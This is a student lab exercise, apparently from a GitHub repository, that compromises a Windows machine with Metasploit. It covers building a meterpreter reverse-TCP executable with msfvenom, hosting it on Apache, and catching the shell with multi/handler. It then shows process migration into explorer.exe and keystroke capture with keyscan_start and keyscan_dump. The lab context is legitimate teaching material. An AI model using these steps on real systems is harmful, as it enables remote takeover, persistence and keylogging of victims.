# EX 6: Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="722" height="362" alt="6 ip con" src="https://github.com/user-attachments/assets/b8f2a0ff-532a-4636-80c1-c853aa51edda" />



Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT

<img width="717" height="130" alt="6 sudo msf" src="https://github.com/user-attachments/assets/1900788b-e8c8-472d-884e-d62aebc24553" />




copy the fun.exe into the apache /var/www/html folder



<img width="352" height="106" alt="6 sudo cp" src="https://github.com/user-attachments/assets/2f06b879-d2b0-4621-b6e3-d56fdc88cc8a" />



Start apache server
sudo systemctl apache2 start

<img width="322" height="101" alt="6 sudo systemctl" src="https://github.com/user-attachments/assets/b494a737-7b43-4bb4-98d1-76abd8b31ef2" />


Check the status of apache2

<img width="928" height="402" alt="6 sudo sys status" src="https://github.com/user-attachments/assets/08e6c447-c759-41e1-8e25-be2362489b7c" />


Invoke msfconsole:
## OUTPUT:


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
<img width="617" height="196" alt="6 msf6 1" src="https://github.com/user-attachments/assets/2fd85b79-6b84-4cfa-ae69-ed28600fd2ba" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
<img width="1868" height="622" alt="6 google" src="https://github.com/user-attachments/assets/da44fe98-fbdb-4a65-a458-7a25346c5998" />


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![240485311-85fb473c-59fe-4042-b163-552fddc735d1](https://github.com/Yogeshvar005/Compromising-windows-using-Metasploit/assets/113497367/b245228d-be3b-418f-8a4d-f0aeb3277dd1)



keyscan_dump	Shows the keystrokes captured so far
![240485244-785ef849-9095-4065-b38a-54b544a0c440](https://github.com/Yogeshvar005/Compromising-windows-using-Metasploit/assets/113497367/bd229a9d-ec46-4590-a561-d81cca631f57)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
